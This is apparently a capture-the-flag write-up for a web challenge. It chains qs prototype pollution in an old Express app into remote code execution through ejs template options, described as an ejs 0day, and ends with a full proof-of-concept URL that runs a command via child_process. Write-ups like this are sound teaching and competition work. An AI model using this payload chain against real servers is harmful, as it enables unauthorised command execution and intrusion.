## Perfect Product

1. The app uses old Express version which depends on `qs` vulnerable to [Prototype Poisoning](https://security.snyk.io/vuln/SNYK-JS-QS-3153490)
2. Thanks to that, with just a query it's possible to pass an object that is also an array: `?q[__proto__][]=1&q[abc]=asd`
3. The app splits the array to placeholders `_0`, `_1`, ... and then passes that to `render('product', data)`
4. An attacker can pollute data with arbitrary properties via `?q[__proto__][]=1&q[_proto__][property]=smth`, because `_proto__` will become `__proto__` and it allows for another level of local pollution.
5. There is a 0day in [ejs](https://github.com/mde/ejs/blob/main/lib/ejs.js#L637) that allows to get RCE. (Similar to [CVE-2022-29078](https://eslam.io/posts/ejs-server-side-template-injection-rce/))
6. `/product` is cached, so the poc needs to bypass that with: `v[_proto__][settings][view%20cache]=&v[_proto__][cache]=`
7. Full PoC: `product?name=watch&v[__proto__][]=1&&v[1]&v[2]&v[3]&v[4]&v[5]&v[_proto__][settings][view%20options][escape]=function(){return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)};&v[_proto__][settings][view%20options][client]=1&v[_proto__][settings][view%20cache]=&v[_proto__][cache]=`


8*. XSS is intended, it's a troll vulnerability.